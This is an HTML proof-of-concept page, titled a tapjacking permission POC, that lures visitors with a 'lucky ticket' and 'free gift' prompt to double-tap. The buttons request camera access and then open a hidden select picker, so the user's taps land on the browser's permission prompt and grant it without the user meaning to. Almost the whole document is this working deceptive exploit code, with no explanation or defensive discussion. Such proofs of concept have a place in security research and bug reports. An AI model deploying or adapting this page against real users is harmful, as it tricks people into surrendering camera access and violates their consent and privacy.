<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Tapjacking Permission POC — Green + Red Opposite</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <style>
    :root{
      --bg: #7242E3;
      --green: #28a745;
      --red: #e3342f;
      --white: #ffffff;
    }

    html,body{
      height:100%;
      margin:0;
      padding:0;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: var(--bg);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .wrap{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:12vh 6vw;
      box-sizing:border-box;
    }

    .card{
      position: relative;
      width:100%;
      max-width:780px;
      text-align:center;
    }

    .primary-btn{
      display:inline-block;
      padding: clamp(12px,3.2vw,18px) clamp(18px,6vw,32px);
      font-size: clamp(18px,4.2vw,26px);
      background: var(--green);
      color: var(--white);
      border:none;
      border-radius:10px;
      cursor:pointer;
      box-shadow:0 8px 20px rgba(0,0,0,0.18);
      touch-action:manipulation;
      -webkit-tap-highlight-color:transparent;
    }

    /* Red circular button — mirror position to right side */
    .red-circle{
      position:absolute;
      right:6%;
      bottom:-42px;
      transform:translateX(-18%);
      width:clamp(48px,9vw,72px);
      height:clamp(48px,9vw,72px);
      border-radius:50%;
      background:var(--red);
      border:4px solid rgba(0,0,0,0.06);
      box-shadow:0 8px 18px rgba(0,0,0,0.22);
      display:flex;
      align-items:center;
      justify-content:center;
      color:var(--white);
      font-weight:700;
      font-size:clamp(16px,3.2vw,20px);
      cursor:pointer;
      touch-action:manipulation;
      z-index:20;
    }

    select {
      opacity:0;
      position:absolute;
      left:-9999px;
    }

    @media (max-width:420px){
      .red-circle{
        right:8%;
        transform:translateX(-10%);
        bottom:-36px;
      }
      .card{padding-bottom:56px;}
    }

    .spacer{height:64px;}
  </style>
</head>
<body>

  <div class="wrap">
    <div class="card" role="region" aria-label="Tapjacking demo area">
      <!-- Green centered button -->
      <button class="primary-btn" onclick="handleClick()" aria-label="Open your lucky ticket">
        🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩 = 🎁] the Green Box to Win a Free Gift! 🎉
      </button>

      <!-- red circle now on opposite (right) side -->
      <button class="red-circle" aria-label="Red circular button" onclick="handleClick()">
        ●
      </button>

      <div class="spacer" aria-hidden="true"></div>

      <select id="selectme" ondblclick="handleDoubleClick()" aria-hidden="true">
        <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
        <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
        <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
        <option></option>
      </select>
    </div>
  </div>

  <script>
    function requestCameraPermission() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          console.log('Camera permission granted.');
          if (stream && stream.getTracks) {
            stream.getTracks().forEach(t => t.stop());
          }
        })
        .catch(function (error) {
          console.error('Error accessing the camera:', error);
        });
    }

    function handleClick() {
      requestCameraPermission();
      setTimeout(function() {
        const sel = document.getElementById("selectme");
        if (sel && typeof sel.showPicker === 'function') {
          sel.showPicker();
        }
      }, 250);
    }

    function handleDoubleClick(){
      console.log('double clicked select');
    }
  </script>
</body>
</html>
